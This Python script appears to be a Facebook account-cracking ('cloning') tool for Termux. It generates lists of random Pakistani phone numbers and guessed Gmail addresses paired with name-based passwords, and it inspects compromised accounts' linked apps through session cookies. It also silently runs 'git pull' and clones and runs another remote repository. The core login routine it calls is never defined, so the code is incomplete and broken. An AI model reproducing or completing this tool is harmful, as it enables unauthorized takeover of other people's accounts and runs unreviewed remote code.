 ####@-----Import-----@####
import os,base64

os.system('git pull -q;rm .rndm')
try:
	import os,sys,time,json,random,re,string,platform,base64,uuid,requests,io,struct
	from string import *
	from concurrent.futures import ThreadPoolExecutor as ThreadPool
except(ImportError):
    os.system("pip install requests")
    pass


try:
    import bs4
except(ImportError):
    os.system("pip install bs4")
    pass

try:
 pass
except:pass


import subprocess
from bs4 import BeautifulSoup
import json,os,time,base64,random,re,sys, subprocess 
from requests.exceptions import ConnectionError as CError
from concurrent.futures import ThreadPoolExecutor as speed

accounts = []
loop = 0


####DESIGN####
def oo(t):
	return '\033[1;91m[\033[1;97m'+str(t)+'\033[1;91m]\033[1;97m '

###USERAGENTSGEN####
'''
fbks=('com.facebook.adsmanager','com.facebook.lite','com.facebook.orca','com.facebook.katana')

android_version = subprocess.check_output('getprop ro.build.version.release',shell=True).decode('utf-8').replace('\n','')
andd=subprocess.check_output('getprop ro.product.brand',shell=True).decode('utf-8').replace('\n','')
model = subprocess.check_output('getprop ro.product.model',shell=True).decode('utf-8').replace('\n','')
carr=subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[1].replace('\n','')
build = subprocess.check_output('getprop ro.build.id',shell=True).decode('utf-8').replace('\n','')

device = {
        'android_version':android_version,
        'model':model,
        'build':build,
         'cr':carr,
         'brand':andd}

'''
ua = []

import requests
rs = requests.get
ua = []

del ua
"""
Mozilla/5.0 (Linux; Android 10; SM-G996U Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Mobile Safari/537.36
"""

ua=[]

##Logo##
P = '\x1b[1;97m'
G='\x1b[1;92m'
R='\x1b[1;91m'
S ='\x1b[1;96m'
Y ='\x1b[1;93m'
uu ='\x1b[1;95m'
tred = speed

	
logo= f'''
{G}  ██   ██ ██   ██ ██     ██
{R}  ██   ██  ██ ██  ██     ██
{Y}  ███████   ███   ██  █  ██
{S}  ██   ██  ██ ██  ██ ███ ██
{uu}  ██   ██ ██   ██  ███ ███ 
\033[1;93m=================================
\033[1;97m Owner  : Hannan x Wasi :/
\033[1;97m GitHub : Hannan-404 :/
\033[1;97m Version:\033[1;92m 0.8 \033[1;97m:/
\033[1;97m Status : Free :/
\033[1;97m Notice : Use 10007/10006 For More OK Ids :/
\033[1;93m=================================
'''

####@-----Menu-----@####
def Hxw_Main():
    os.system("clear")
    print(logo)
    print(f"{oo(1)}File Cloning")
    print(f"{oo(2)}Pak Random Cloning")
    print(f"{oo(3)}Gmail Cloning")  
    print(f"{oo(4)}Create File")
    print(f"{oo(0)}Exit")
    inpp = input(f"{oo('?')}Your Choice : ")
    if inpp == "1":
        file()
    if inpp == '2':pak()
    if inpp =='3':
        gmail()
    if inpp == "4":
     print(f'{oo("+")}Loading Best File Create Command ')
     os.system('cd && git clone --depth=1 https://github.com/Hannan-404/FILE')
     os.system('cd && cd FILE ;python FILE.py')
     exit()
    if inpp == "0":
     exit('Exit!')
     
     
l = []

####@-----File-----@####
def file():
    os.system("clear")
    print(logo)
    if 'gm' in l:
        file = '.Hannan'
    else:
        file = input(f"{oo('-')}Enter File: ")
    try:
        for x in open(file,'r').readlines():
            accounts.append(x.strip())
    except:
        print(f"{oo('!')}File Not Found");time.sleep(1)
        Hxw_Main()
     
    method()
    exit()
    
            
   
####@-----AppCheck-----@####
def check(session,coki):
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
    	pass
    else:
        for gm in game:
            print(f"\033[1;97m---\033[1;96m"+gm.replace('huwtn',' hxw-code=hannan-33'))
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        pass
    else:
        for gm in game:
            print(f"\033[1;97m---\033[1;93m"+gm.replace('riJan','Hxw-182^)Code=hannan-2233]'))


####@-----Gmail-----@####

def gmail():     
        os.system('rm -rf .Hannan')
        first = input(f'{oo("?")}Put First Name: ')
        last = input(f'{oo("?")}Put Last Name: ')
        domain = input(f'{oo("?")}Put Domain: ')
        try:
            limit = input(f'{oo("?")}Put Limit: ')
        except ValueError:
            limit = 5000
        lists = ['3','4']
        for xd in range(int(limit)):
            lchoice = random.choice(lists)
            if '3' in lchoice:
                mail = ''.join(random.choice(string.digits) for _ in range(3))
                open('.Hannan','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')
            else:
                mail = ''.join(random.choice(string.digits) for _ in range(4))
                open('.Hannan','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')
            fo = open('.Hannan', 'r').read().splitlines()
        with tred(max_workers=30) as king___xd:
            tl = str(len(fo))
            tk = first+last
            l.append('gm')
            file()

       
        
####@-----PakNumber-----@####


def pak():
	user=[]
	code = input(f'{oo("!")}Put Code : ')
	try:
		limit = int(input(f'{oo("?")}Put Limit :  '))
	except ValueError:
		limit = 5000
	for nmbr in range(limit):
		nmp = ''.join(random.choice(string.digits) for _ in range(7))
		user.append(nmp)
	for psx in user:
		ids = code+psx
		open('.rndm','a').write(ids+'|'+psx+' '+ids+'\n')
	andom()



####@-----UserAgent----@####
"""
Mozilla/5.0 (Windows; U; Windows NT 6.1) AppleWebKit/532.1.2 (KHTML, like Gecko) Chrome/24.0.887.0 Safari/532.1.2
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_2 rv:6.0; ZH) AppleWebKit/534.2.0 (KHTML, like Gecko) Version/6.0.7 Safari/534.2.0
Mozilla/5.0 (Windows NT 6.2; rv:10.8) Gecko/20100101 Firefox/10.8.7
Mozilla/5.0 (Windows; U; Windows NT 6.0) AppleWebKit/531.0.0 (KHTML, like Gecko) Chrome/26.0.880.0 Safari/531.0.0
Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.3; Trident/7.0; .NET CLR 4.0.59997.7)
Mozilla/5.0 (Windows; U; Windows NT 6.2) AppleWebKit/537.0.0 (KHTML, like Gecko) Chrome/28.0.835.0 Safari/537.0.0
Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 6.1; Trident/4.1; .NET CLR 1.3.61294.7)
Mozilla/5.0 (Windows NT 6.1; rv:14.4) Gecko/20100101 Firefox/14.4.5
Mozilla/5.0 (Windows; U; Windows NT 6.1) AppleWebKit/535.2.0 (KHTML, like Gecko) Chrome/22.0.895.0 Safari/535.2.0
Mozilla/5.0 (Windows; U; Windows NT 6.2) AppleWebKit/536.0.2 (KHTML, like Gecko) Chrome/21.0.818.0 Safari/536.0.2
Mozilla/5.0 (Windows; U; Windows NT 6.1) AppleWebKit/531.2.2 (KHTML, like Gecko) Chrome/29.0.888.0 Safari/531.2.2
Mozilla/5.0 (Windows; U; Windows NT 6.2) AppleWebKit/537.1.1 (KHTML, like Gecko) Chrome/29.0.804.0 Safari/537.1.1
Opera/10.88 (X11; Linux i686; U; RM Presto/2.9.182 Version/11.00)
Mozilla/5.0 (Windows; U; Windows NT 6.1) AppleWebKit/534.1.1 (KHTML, like Gecko) Chrome/24.0.813.0 Safari/534.1.1
Mozilla/5.0 (Windows; U; Windows NT 5.0) AppleWebKit/532.0.1 (KHTML, like Gecko) Chrome/37.0.875.0 Safari/532.0.1
Mozilla/5.0 (Windows; U; Windows NT 6.1) AppleWebKit/531.2.1 (KHTML, like Gecko) Chrome/17.0.800.0 Safari/531.2.1
Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:12.7) Gecko/20100101 Firefox/12.7.1
Mozilla/5.0 (Windows NT 5.1; rv:13.2) Gecko/20100101 Firefox/13.2.3
Mozilla/5.0 (Windows; U; Windows NT 5.0) AppleWebKit/532.0.1 (KHTML, like Gecko) Chrome/32.0.840.0 Safari/532.0.1
Mozilla/5.0 (Windows; U; Windows NT 6.3) AppleWebKit/535.1.1 (KHTML, like Gecko) Chrome/25.0.818.0 Safari/535.1.1
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_7 rv:3.0; OC) AppleWebKit/531.2.2 (KHTML, like Gecko) Version/4.0.1 Safari/531.2.2
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_5_6 rv:2.0; SE) AppleWebKit/538.2.2 (KHTML, like Gecko) Version/6.1.8 Safari/538.2.2
Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 5.2; Trident/3.1; .NET CLR 1.8.96158.8)
Mozilla/5.0 (Windows; U; Windows NT 5.0) AppleWebKit/532.2.2 (KHTML, like Gecko) Chrome/27.0.862.0 Safari/532.2.2
Mozilla/5.0 (Windows NT 6.0; rv:9.4) Gecko/20100101 Firefox/9.4.5
Mozilla/5.0 (Windows; U; Windows NT 5.3) AppleWebKit/537.0.1 (KHTML, like Gecko) Chrome/34.0.828.0 Safari/537.0.1
Mozilla/5.0 (Windows; U; Windows NT 5.0) AppleWebKit/537.2.2 (KHTML, like Gecko) Chrome/32.0.824.0 Safari/537.2.2
Mozilla/5.0 (Windows; U; Windows NT 6.2) AppleWebKit/531.2.2 (KHTML, like Gecko) Chrome/34.0.803.0 Safari/531.2.2
Mozilla/5.0 (Windows; U; Windows NT 6.3) AppleWebKit/536.2.1 (KHTML, like Gecko) Chrome/15.0.874.0 Safari/536.2.1
Mozilla/5.0 (Windows; U; Windows NT 5.0) AppleWebKit/532.0.0 (KHTML, like Gecko) Chrome/36.0.885.0 Safari/532.0.0
Mozilla/5.0 (Windows; U; Windows NT 5.2) AppleWebKit/532.2.0 (KHTML, like Gecko) Chrome/37.0.823.0 Safari/532.2.0
Mozilla/5.0 (Windows NT 6.2; rv:6.0) Gecko/20100101 Firefox/6.0.4
Mozilla/5.0 (Windows; U; Windows NT 5.0) AppleWebKit/534.2.1 (KHTML, like Gecko) Chrome/14.0.834.0 Safari/534.2.1
Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 5.0; Trident/4.0; .NET CLR 2.9.44621.4)
Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.8.5; rv:10.8) Gecko/20100101 Firefox/10.8.0
Mozilla/5.0 (Windows; U; Windows NT 6.3) AppleWebKit/538.0.2 (KHTML, like Gecko) Chrome/19.0.843.0 Safari/538.0.2
Mozilla/5.0 (Windows; U; Windows NT 6.1) AppleWebKit/537.1.2 (KHTML, like Gecko) Chrome/37.0.864.0 Safari/537.1.2
Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9.1; rv:11.6) Gecko/20100101 Firefox/11.6.1
Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 5.1; Trident/3.1; .NET CLR 4.4.26937.0)
Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.6.4; rv:7.9) Gecko/20100101 Firefox/7.9.8
Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_9_5)  AppleWebKit/533.1.0 (KHTML, like Gecko) Chrome/23.0.839.0 Safari/533.1.0
Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.0; Trident/4.0; .NET CLR 2.1.62208.9)
Mozilla/5.0 (Windows; U; Windows NT 6.3) AppleWebKit/532.1.2 (KHTML, like Gecko) Chrome/36.0.835.0 Safari/532.1.2
Mozilla/5.0 (Windows; U; Windows NT 6.1) AppleWebKit/538.0.2 (KHTML, like Gecko) Chrome/25.0.830.0 Safari/538.0.2
Mozilla/5.0 (Windows; U; Windows NT 5.1) AppleWebKit/538.0.0 (KHTML, like Gecko) Chrome/38.0.882.0 Safari/538.0.0
Mozilla/5.0 (Windows; U; Windows NT 6.3) AppleWebKit/531.0.2 (KHTML, like Gecko) Chrome/28.0.897.0 Safari/531.0.2
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_5_7)  AppleWebKit/532.1.2 (KHTML, like Gecko) Chrome/30.0.850.0 Safari/532.1.2
Mozilla/5.0 (Windows; U; Windows NT 6.0) AppleWebKit/533.2.0 (KHTML, like Gecko) Chrome/15.0.860.0 Safari/533.2.0
Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_7_8)  AppleWebKit/538.2.1 (KHTML, like Gecko) Chrome/25.0.843.0 Safari/538.2.1
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_0 rv:6.0; SK) AppleWebKit/534.1.1 (KHTML, like Gecko) Version/5.0.7 Safari/534.1.1
Mozilla/5.0 (Windows; U; Windows NT 5.3) AppleWebKit/537.1.1 (KHTML, like Gecko) Chrome/29.0.899.0 Safari/537.1.1
Mozilla/5.0 (Windows NT 5.0; Win64; x64; rv:12.1) Gecko/20100101 Firefox/12.1.2
Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 5.0; Trident/6.0; .NET CLR 2.0.30033.6)
Mozilla/5.0 (Windows; U; Windows NT 6.1) AppleWebKit/534.0.2 (KHTML, like Gecko) Chrome/35.0.871.0 Safari/534.0.2
Mozilla/5.0 (Windows; U; Windows NT 5.3) AppleWebKit/538.0.1 (KHTML, like Gecko) Chrome/37.0.849.0 Safari/538.0.1
Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 5.0; Trident/3.0; .NET CLR 4.6.97051.6)
Mozilla/5.0 (Windows; U; Windows NT 6.3) AppleWebKit/531.2.0 (KHTML, like Gecko) Chrome/24.0.839.0 Safari/531.2.0
Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; .NET CLR 2.1.79714.3)
Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 5.0; Trident/6.0; .NET CLR 2.5.95067.8)
Mozilla/5.0 (Windows; U; Windows NT 6.0) AppleWebKit/535.1.0 (KHTML, like Gecko) Chrome/24.0.835.0 Safari/535.1.0
Opera/11.47 (Windows NT 6.0; U; VO Presto/2.9.177 Version/11.00)
Mozilla/5.0 (Windows; U; Windows NT 6.2) AppleWebKit/532.1.2 (KHTML, like Gecko) Chrome/39.0.844.0 Safari/532.1.2
Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.3; Trident/5.0; .NET CLR 1.0.94887.4)
Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_9 rv:6.0; SE) AppleWebKit/531.2.1 (KHTML, like Gecko) Version/4.0.5 Safari/531.2.1
Mozilla/5.0 (Windows; U; Windows NT 5.1) AppleWebKit/532.2.1 (KHTML, like Gecko) Chrome/34.0.809.0 Safari/532.2.1
Mozilla/5.0 (Windows; U; Windows NT 6.3) AppleWebKit/535.2.1 (KHTML, like Gecko) Chrome/37.0.861.0 Safari/535.2.1
Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.0; Trident/5.1; .NET CLR 4.0.51067.4)
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_2 rv:6.0; LV) AppleWebKit/532.2.2 (KHTML, like Gecko) Version/7.0.10 Safari/532.2.2
Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:9.8) Gecko/20100101 Firefox/9.8.9
Mozilla/5.0 (Windows; U; Windows NT 6.3) AppleWebKit/534.2.0 (KHTML, like Gecko) Chrome/14.0.828.0 Safari/534.2.0
Mozilla/5.0 (Windows; U; Windows NT 5.0) AppleWebKit/538.0.0 (KHTML, like Gecko) Chrome/31.0.855.0 Safari/538.0.0
Mozilla/5.0 (Windows; U; Windows NT 5.1) AppleWebKit/538.0.2 (KHTML, like Gecko) Chrome/36.0.893.0 Safari/538.0.2
Mozilla/5.0 (Windows NT 6.2; WOW64; rv:7.7) Gecko/20100101 Firefox/7.7.0
Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.2; Trident/3.1; .NET CLR 4.8.30322.3)
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_5_5 rv:3.0; DA) AppleWebKit/535.1.0 (KHTML, like Gecko) Version/6.0.2 Safari/535.1.0
Mozilla/5.0 (Windows; U; Windows NT 6.0) AppleWebKit/537.2.2 (KHTML, like Gecko) Chrome/26.0.889.0 Safari/537.2.2
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_7 rv:4.0; FA) AppleWebKit/533.1.1 (KHTML, like Gecko) Version/6.1.7 Safari/533.1.1
Mozilla/5.0 (Windows NT 6.3; WOW64; rv:14.4) Gecko/20100101 Firefox/14.4.9
Mozilla/5.0 (Windows; U; Windows NT 5.1) AppleWebKit/536.2.2 (KHTML, like Gecko) Chrome/19.0.855.0 Safari/536.2.2
Mozilla/5.0 (Windows; U; Windows NT 5.0) AppleWebKit/537.0.2 (KHTML, like Gecko) Chrome/16.0.805.0 Safari/537.0.2
Mozilla/5.0 (Windows NT 5.2; rv:5.9) Gecko/20100101 Firefox/5.9.5
Mozilla/5.0 (Windows; U; Windows NT 5.0) AppleWebKit/532.0.1 (KHTML, like Gecko) Chrome/35.0.843.0 Safari/532.0.1
Mozilla/5.0 (Windows NT 5.2; rv:14.3) Gecko/20100101 Firefox/14.3.1
Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_8_2 rv:5.0; JA) AppleWebKit/538.1.0 (KHTML, like Gecko) Version/5.0.5 Safari/538.1.0
Mozilla/5.0 (Windows; U; Windows NT 6.1) AppleWebKit/533.1.2 (KHTML, like Gecko) Chrome/36.0.879.0 Safari/533.1.2
Mozilla/5.0 (Windows; U; Windows NT 6.1) AppleWebKit/536.0.1 (KHTML, like Gecko) Chrome/21.0.886.0 Safari/536.0.1
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_5_7 rv:3.0; VO) AppleWebKit/538.2.0 (KHTML, like Gecko) Version/4.1.1 Safari/538.2.0
Mozilla/5.0 (Windows; U; Windows NT 5.0) AppleWebKit/538.1.1 (KHTML, like Gecko) Chrome/14.0.868.0 Safari/538.1.1
Mozilla/5.0 (Windows; U; Windows NT 6.0) AppleWebKit/533.0.1 (KHTML, like Gecko) Chrome/18.0.852.0 Safari/533.0.1
Mozilla/5.0 (Macintosh; PPC Mac OS X 10_7_4)  AppleWebKit/534.1.1 (KHTML, like Gecko) Chrome/26.0.868.0 Safari/534.1.1
Mozilla/5.0 (Windows NT 5.2; Win64; x64; rv:7.5) Gecko/20100101 Firefox/7.5.6
Mozilla/5.0 (Windows; U; Windows NT 5.2) AppleWebKit/534.0.0 (KHTML, like Gecko) Chrome/14.0.849.0 Safari/534.0.0
Mozilla/5.0 (Windows; U; Windows NT 6.3) AppleWebKit/537.1.0 (KHTML, like Gecko) Chrome/33.0.891.0 Safari/537.1.0
Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.5.5; rv:15.7) Gecko/20100101 Firefox/15.7.5
Mozilla/5.0 (Macintosh; PPC Mac OS X 10.9.4; rv:13.7) Gecko/20100101 Firefox/13.7.9
Mozilla/5.0 (Windows; U; Windows NT 6.2) AppleWebKit/532.0.1 (KHTML, like Gecko) Chrome/14.0.824.0 Safari/532.0.1
Mozilla/5.0 (Windows; U; Windows NT 5.2) AppleWebKit/537.0.2 (KHTML, like Gecko) Chrome/34.0.812.0 Safari/537.0.2
Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 5.3; Trident/3.1; .NET CLR 1.5.72567.5)
Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_3 rv:2.0; OC) AppleWebKit/534.2.0 (KHTML, like Gecko) Version/7.1.2 Safari/534.2.0
Mozilla/5.0 (Windows; U; Windows NT 5.1) AppleWebKit/531.2.1 (KHTML, like Gecko) Chrome/18.0.807.0 Safari/531.2.1
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_5_3)  AppleWebKit/532.0.2 (KHTML, like Gecko) Chrome/35.0.832.0 Safari/532.0.2
Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/6.1; .NET CLR 4.1.63313.9)
Mozilla/5.0 (Windows; U; Windows NT 6.1) AppleWebKit/536.2.0 (KHTML, like Gecko) Chrome/32.0.894.0 Safari/536.2.0
Mozilla/5.0 (Windows; U; Windows NT 6.0) AppleWebKit/531.2.2 (KHTML, like Gecko) Chrome/33.0.821.0 Safari/531.2.2
Mozilla/5.0 (Windows NT 5.0; WOW64; rv:10.9) Gecko/20100101 Firefox/10.9.8
Mozilla/5.0 (Windows; U; Windows NT 5.0) AppleWebKit/536.2.0 (KHTML, like Gecko) Chrome/39.0.850.0 Safari/536.2.0
Mozilla/5.0 (Windows; U; Windows NT 6.1) AppleWebKit/531.1.2 (KHTML, like Gecko) Chrome/31.0.889.0 Safari/531.1.2
Opera/11.7 (Windows NT 5.0; U; NB Presto/2.9.176 Version/11.00)
Mozilla/5.0 (Windows; U; Windows NT 6.2) AppleWebKit/535.1.0 (KHTML, like Gecko) Chrome/14.0.864.0 Safari/535.1.0
Mozilla/5.0 (Windows NT 5.1; Win64; x64; rv:8.2) Gecko/20100101 Firefox/8.2.8
Mozilla/5.0 (Windows; U; Windows NT 6.2) AppleWebKit/531.1.0 (KHTML, like Gecko) Chrome/17.0.820.0 Safari/531.1.0
Mozilla/5.0 (Windows; U; Windows NT 6.0) AppleWebKit/535.2.1 (KHTML, like Gecko) Chrome/17.0.831.0 Safari/535.2.1
Mozilla/5.0 (Windows NT 6.3; rv:14.1) Gecko/20100101 Firefox/14.1.2
Mozilla/5.0 (Windows; U; Windows NT 5.1) AppleWebKit/537.2.0 (KHTML, like Gecko) Chrome/23.0.807.0 Safari/537.2.0
Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 5.0; Trident/6.0; .NET CLR 3.2.64646.6)
Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_10_2 rv:6.0; ES) AppleWebKit/536.0.1 (KHTML, like Gecko) Version/6.1.10 Safari/536.0.1
Mozilla/5.0 (Windows; U; Windows NT 6.3) AppleWebKit/533.2.0 (KHTML, like Gecko) Chrome/22.0.856.0 Safari/533.2.0
Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_9_3 rv:3.0; PT) AppleWebKit/531.0.2 (KHTML, like Gecko) Version/5.0.0 Safari/531.0.2
Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.1; .NET CLR 2.0.38698.6)
Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 5.2; Trident/7.0; .NET CLR 3.3.96303.3)
Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 5.3; Trident/4.0; .NET CLR 3.3.51447.7)
Mozilla/5.0 (Windows; U; Windows NT 5.2) AppleWebKit/536.1.2 (KHTML, like Gecko) Chrome/38.0.825.0 Safari/536.1.2
Mozilla/5.0 (Windows; U; Windows NT 6.0) AppleWebKit/534.0.2 (KHTML, like Gecko) Chrome/29.0.827.0 Safari/534.0.2
Mozilla/5.0 (Windows; U; Windows NT 6.1) AppleWebKit/531.1.2 (KHTML, like Gecko) Chrome/23.0.832.0 Safari/531.1.2
Mozilla/5.0 (Windows NT 6.2; rv:9.0) Gecko/20100101 Firefox/9.0.6
Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:8.9) Gecko/20100101 Firefox/8.9.5
Mozilla/5.0 (Windows; U; Windows NT 6.2) AppleWebKit/538.0.1 (KHTML, like Gecko) Chrome/36.0.885.0 Safari/538.0.1
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_5_4 rv:3.0; GV) AppleWebKit/536.2.2 (KHTML, like Gecko) Version/7.0.8 Safari/536.2.2
Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; .NET CLR 3.3.84209.6)
Mozilla/5.0 (Windows; U; Windows NT 6.0) AppleWebKit/538.2.0 (KHTML, like Gecko) Chrome/14.0.844.0 Safari/538.2.0
Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:13.9) Gecko/20100101 Firefox/13.9.1
Mozilla/5.0 (Windows NT 5.1; Win64; x64; rv:12.7) Gecko/20100101 Firefox/12.7.5
Mozilla/5.0 (Windows; U; Windows NT 6.2) AppleWebKit/531.0.2 (KHTML, like Gecko) Chrome/33.0.809.0 Safari/531.0.2
Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 5.2; Trident/7.0; .NET CLR 2.5.41588.9)
Mozilla/5.0 (Windows; U; Windows NT 5.2) AppleWebKit/535.2.2 (KHTML, like Gecko) Chrome/20.0.844.0 Safari/535.2.2
Mozilla/5.0 (Windows; U; Windows NT 6.3) AppleWebKit/535.2.0 (KHTML, like Gecko) Chrome/31.0.814.0 Safari/535.2.0
Mozilla/5.0 (X11; Linux i686; rv:8.1) Gecko/20100101 Firefox/8.1.0
Mozilla/5.0 (Windows; U; Windows NT 5.2) AppleWebKit/534.0.0 (KHTML, like Gecko) Chrome/31.0.885.0 Safari/534.0.0
Mozilla/5.0 (Windows; U; Windows NT 5.3) AppleWebKit/531.2.0 (KHTML, like Gecko) Chrome/13.0.823.0 Safari/531.2.0
Mozilla/5.0 (Windows NT 6.0; rv:14.3) Gecko/20100101 Firefox/14.3.5
Mozilla/5.0 (Windows; U; Windows NT 5.0) AppleWebKit/534.2.0 (KHTML, like Gecko) Chrome/30.0.848.0 Safari/534.2.0
Mozilla/5.0 (Windows NT 6.0; WOW64; rv:10.4) Gecko/20100101 Firefox/10.4.9
Mozilla/5.0 (Windows; U; Windows NT 6.1) AppleWebKit/534.0.2 (KHTML, like Gecko) Chrome/23.0.808.0 Safari/534.0.2
Mozilla/5.0 (Windows; U; Windows NT 5.2) AppleWebKit/536.2.0 (KHTML, like Gecko) Chrome/16.0.844.0 Safari/536.2.0
Mozilla/5.0 (Windows; U; Windows NT 6.1) AppleWebKit/534.1.0 (KHTML, like Gecko) Chrome/21.0.811.0 Safari/534.1.0
Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.3; Trident/3.1; .NET CLR 4.3.79172.7)
Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_3)  AppleWebKit/534.1.2 (KHTML, like Gecko) Chrome/29.0.809.0 Safari/534.1.2
Mozilla/5.0 (Windows NT 5.1; Win64; x64; rv:7.8) Gecko/20100101 Firefox/7.8.2
Mozilla/5.0 (Windows; U; Windows NT 6.2) AppleWebKit/536.0.1 (KHTML, like Gecko) Chrome/27.0.859.0 Safari/536.0.1
Mozilla/5.0 (Windows; U; Windows NT 6.1) AppleWebKit/538.0.0 (KHTML, like Gecko) Chrome/26.0.804.0 Safari/538.0.0
Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 6.1; Trident/7.0; .NET CLR 1.0.41176.6)
Mozilla/5.0 (Windows; U; Windows NT 6.1) AppleWebKit/532.0.1 (KHTML, like Gecko) Chrome/36.0.886.0 Safari/532.0.1
Mozilla/5.0 (Windows; U; Windows NT 5.3) AppleWebKit/532.2.1 (KHTML, like Gecko) Chrome/31.0.812.0 Safari/532.2.1
Mozilla/5.0 (Windows NT 5.1; Win64; x64; rv:12.9) Gecko/20100101 Firefox/12.9.6
Mozilla/5.0 (Windows; U; Windows NT 6.3) AppleWebKit/535.0.0 (KHTML, like Gecko) Chrome/39.0.866.0 Safari/535.0.0
Mozilla/5.0 (Windows; U; Windows NT 5.1) AppleWebKit/533.1.1 (KHTML, like Gecko) Chrome/31.0.858.0 Safari/533.1.1
Mozilla/5.0 (Windows; U; Windows NT 6.1) AppleWebKit/533.0.0 (KHTML, like Gecko) Chrome/27.0.866.0 Safari/533.0.0
Mozilla/5.0 (Windows; U; Windows NT 5.2) AppleWebKit/537.0.1 (KHTML, like Gecko) Chrome/36.0.823.0 Safari/537.0.1
Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/7.0; .NET CLR 1.9.27406.8)
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_1 rv:3.0; ET) AppleWebKit/533.2.0 (KHTML, like Gecko) Version/7.1.6 Safari/533.2.0
Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10.9.4; rv:11.2) Gecko/20100101 Firefox/11.2.6
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_4 rv:5.0; HU) AppleWebKit/536.0.0 (KHTML, like Gecko) Version/4.1.10 Safari/536.0.0
Mozilla/5.0 (Windows; U; Windows NT 5.2) AppleWebKit/531.1.2 (KHTML, like Gecko) Chrome/35.0.886.0 Safari/531.1.2
Mozilla/5.0 (Windows NT 5.0; WOW64; rv:10.2) Gecko/20100101 Firefox/10.2.1
Mozilla/5.0 (Windows; U; Windows NT 5.1) AppleWebKit/536.0.1 (KHTML, like Gecko) Chrome/31.0.890.0 Safari/536.0.1
Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_8_0)  AppleWebKit/534.1.0 (KHTML, like Gecko) Chrome/39.0.865.0 Safari/534.1.0
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_5_2 rv:4.0; GL) AppleWebKit/538.0.1 (KHTML, like Gecko) Version/7.1.3 Safari/538.0.1
Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 5.2; Trident/3.0; .NET CLR 3.5.70332.5)
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_5_1 rv:5.0; TY) AppleWebKit/531.0.1 (KHTML, like Gecko) Version/4.1.8 Safari/531.0.1
Mozilla/5.0 (Windows; U; Windows NT 6.3) AppleWebKit/532.0.1 (KHTML, like Gecko) Chrome/28.0.862.0 Safari/532.0.1
Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 5.2; Trident/6.0; .NET CLR 2.6.59686.4)
Mozilla/5.0 (Windows; U; Windows NT 5.2) AppleWebKit/532.2.2 (KHTML, like Gecko) Chrome/14.0.887.0 Safari/532.2.2
Mozilla/5.0 (Windows NT 6.0; Win64; x64; rv:12.4) Gecko/20100101 Firefox/12.4.8
Mozilla/5.0 (Windows; U; Windows NT 5.0) AppleWebKit/533.2.0 (KHTML, like Gecko) Chrome/15.0.878.0 Safari/533.2.0
